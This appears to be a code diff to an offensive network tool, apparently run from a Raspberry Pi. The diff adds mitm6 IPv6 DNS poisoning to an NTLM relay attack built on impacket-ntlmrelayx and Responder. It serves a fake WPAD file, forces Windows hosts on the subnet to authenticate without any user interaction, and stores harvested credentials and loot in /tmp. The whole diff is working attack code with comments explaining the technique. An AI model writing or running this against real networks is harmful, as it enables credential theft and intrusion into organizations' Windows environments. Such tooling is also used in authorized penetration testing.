@@ -87,14 +87,51 @@ def wait_and_capture(iface: str, timeout: int = 120) -> list[str]:
 
 # ── NTLM relay attack ─────────────────────────────────────────────────────────
 
-def start_relay(targets: list[str], iface: str, timeout: int = 120) -> list[dict]:
+_mitm6_proc = None
+
+
+def start_mitm6(iface_name: str):
+    """
+    Launch mitm6 — sends rogue DHCPv6 responses so Windows machines use our
+    Pi as their IPv6 DNS server.  This causes them to query for WPAD over
+    HTTP, which ntlmrelayx intercepts and uses to harvest NTLM credentials
+    without any user interaction.
+
+    mitm6 install: pip3 install mitm6 --break-system-packages
+    """
+    global _mitm6_proc
+    exe = shutil.which("mitm6") or os.path.expanduser("~/.local/bin/mitm6")
+    if not os.path.exists(exe or ""):
+        tui.warn("mitm6 not found — IPv6 DNS poisoning disabled.")
+        tui.info("Install: pip3 install mitm6 --break-system-packages")
+        return
+
+    cmd = [exe, "-i", iface_name, "-d", "local", "--ignore-nofqdn"]
+    tui.info(f"Starting mitm6 on {iface_name} (IPv6 DNS poisoning) ...")
+    _mitm6_proc = subprocess.Popen(
+        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+
+def stop_mitm6():
+    global _mitm6_proc
+    if _mitm6_proc:
+        _mitm6_proc.terminate()
+        _mitm6_proc = None
+
+
+def start_relay(targets: list[str], iface_name: str, timeout: int = 120,
+                use_mitm6: bool = True) -> list[dict]:
     """
     Run impacket-ntlmrelayx against targets that have SMB signing disabled.
     Relays captured authentications in real-time — no need to crack hashes.
-    Returns list of { ip, user, samba_shell } for successful relays.
 
-    Requires: impacket-ntlmrelayx, and Responder with SMB/HTTP disabled
-    (edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off).
+    If use_mitm6=True (default), also launches mitm6 to force Windows machines
+    on the subnet to authenticate via IPv6 WPAD — no waiting for organic traffic.
+
+    Returns list of { ip, user } for successful relays.
+
+    Requires: impacket-ntlmrelayx, Responder with SMB/HTTP disabled.
     """
     global _relay_proc, _relay_hits
     _relay_hits = []
@@ -111,16 +148,24 @@ def start_relay(targets: list[str], iface: str, timeout: int = 120) -> list[dict
             f.write(f"smb://{t}\n")
 
     tui.info(f"Starting NTLM relay → {len(targets)} target(s) ...")
-    tui.info("Waiting for authentications to relay ...")
 
-    cmd = [exe, "-tf", target_file, "-smb2support", "-of", "/tmp/cascade_relay_hashes"]
+    # -wh wpad.local makes ntlmrelayx serve a fake WPAD file over HTTP,
+    # which mitm6 causes Windows to request automatically.
+    cmd = [exe, "-tf", target_file, "-smb2support",
+           "-wh", "wpad.local",
+           "-l", "/tmp/cascade_relay_loot",
+           "-of", "/tmp/cascade_relay_hashes"]
     _relay_proc = subprocess.Popen(
         cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
     )
     threading.Thread(target=_relay_reader, daemon=True).start()
 
-    # Also start Responder with SMB/HTTP off so relay can use those ports
-    _start_responder_relay_mode(iface)
+    # Responder in relay mode (SMB/HTTP off so ntlmrelayx can own those ports)
+    _start_responder_relay_mode(iface_name)
+
+    # mitm6 for active IPv6 DNS poisoning — forces auth without user interaction
+    if use_mitm6:
+        start_mitm6(iface_name)
 
     deadline = time.time() + timeout
     bar_w    = 40
@@ -181,6 +226,7 @@ def _relay_reader():
 
 def stop_relay():
     global _relay_proc, _proc
+    stop_mitm6()
     for p in (_relay_proc, _proc):
         if p:
             try:
